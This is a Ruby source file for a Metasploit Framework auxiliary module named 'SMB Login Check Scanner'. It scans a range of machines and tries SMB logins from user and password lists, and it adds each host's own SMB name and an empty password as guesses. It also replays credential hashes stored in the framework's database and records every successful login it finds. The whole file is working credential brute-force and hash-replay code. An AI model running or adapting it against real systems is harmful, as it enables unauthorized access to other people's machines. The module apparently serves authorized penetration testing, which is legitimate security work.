
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB	
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	def proto
		'smb'
	end
	
	def initialize
		super(
			'Name'        => 'SMB Login Check Scanner',
			#'Version'     => '$Revision$',
			'Description' => %q{
				This module will test a SMB login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => 'tebo <tebo [at] attackresearch [dot] com>',
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST')

		# These are normally advanced options, but for this module they have a
		# more active role, so make them regular options.
		register_options(
			[	
				OptString.new('SMBPass', [ false, "SMB Password" ]),
				OptString.new('SMBUser', [ false, "SMB Username" ]),
				OptString.new('SMBDomain', [ false, "SMB Domain", 'WORKGROUP']),
			], self.class)

		@passes = [ '' ]

	end

	def run_host(ip)
		print_status("Starting host #{ip}")
		if (datastore["SMBUser"] and not datastore["SMBUser"].empty?)
			# then just do this user/pass
			try_user_pass(datastore["SMBUser"], datastore["SMBPass"])
		else
			begin
				# Add the hosts smb name as a password to try
				connect
				smb_fingerprint
				@passes.push(simple.client.default_name) if simple.client.default_name
				disconnect

				each_user_pass { |user, pass|
					try_user_pass(user, pass)
				}
			rescue ::Rex::ConnectionError
				nil
			end
		end
	end

	def try_user_pass(user, pass)
		datastore["SMBUser"] = user
		datastore["SMBPass"] = pass
		#$stdout.puts("#{user} : #{pass}")

		# Connection problems are dealt with at a higher level
		connect()

		begin
			smb_login()
		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
			return
		end

		if(simple.client.auth_user)
			print_good("#{rhost} - SUCCESSFUL LOGIN (#{smb_peer_os}) #{user} : #{pass}")
			report_auth_info(
				:host	=> rhost,
				:proto	=> 'smb',
				:user	=> user,
				:pass	=> pass,
				:targ_host	=> rhost,
				:targ_port	=> datastore['RPORT']
			)
		else 
			print_status("#{rhost} - GUEST LOGIN (#{smb_peer_os}) #{user} : #{pass}")
		end

		disconnect()
		return :next_user
	end

	def next_user_pass(state)
		return nil if state[:status] == :done
		if (not state[:auth_info])
			state[:auth_info] = framework.db.get_auth_info(:proto => 'smb')
			return nil if not state[:auth_info]
			state[:auth_info].delete_if { |a| not a.kind_of? Hash }
			state[:auth_info].delete_if { |a| not a.has_key? :user or not a.has_key? :hash }
			state[:idx] = 0
		end
		if state[:auth_info][state[:idx]]
			user = state[:auth_info][state[:idx]][:user]
			pass = state[:auth_info][state[:idx]][:hash]
			state[:idx] += 1
			return [ user, pass ]
		end
		return nil
	end

	def next_pass(state)
		return nil if state[:status] == :done
		return nil if state[:status] == :next_user
		if not state[:idx]
			state[:idx] = 0
		end
		pass = @passes[state[:idx]]
		state[:idx] += 1
		return pass
	end

end

